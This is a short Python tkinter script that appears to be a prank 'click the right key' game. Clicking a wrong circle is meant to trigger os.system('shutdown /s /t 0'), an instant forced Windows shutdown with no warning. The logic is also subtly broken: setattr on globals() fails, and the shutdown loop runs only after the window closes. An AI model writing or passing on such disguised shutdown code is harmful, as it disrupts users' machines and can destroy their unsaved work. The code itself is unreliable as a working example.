import os
import tkinter as tk

wkp = False

def generate_right_key():
    root = tk.Tk()
    canvas = tk.Canvas(root, width=200, height=200)
    canvas.pack()
    canvas.create_oval(0, 0, 200, 200, fill="blue")
    canvas.bind("<Button-1>", lambda event: exit())

def generate_wrong_key():
    root = tk.Tk()
    canvas = tk.Canvas(root, width=200, height=200)
    canvas.pack()
    canvas.create_oval(0, 0, 200, 200, fill="blue")
    canvas.bind("<Button-1>", lambda event: setattr(globals(), 'wkp', True))

def start():
    root = tk.Tk()
    generate_right_key()
    generate_wrong_key()
    generate_wrong_key()
    generate_wrong_key()
    generate_wrong_key()
    generate_wrong_key()
    generate_wrong_key()
    generate_wrong_key()
    canvas = tk.Canvas(root, width=200, height=200)
    canvas.pack()
    canvas.create_text(100, 100, text="Click the right key!", font=("Arial", 16))
    root.mainloop()

start()
while True:
    if wkp == True:
        os.system("shutdown /s /t 0")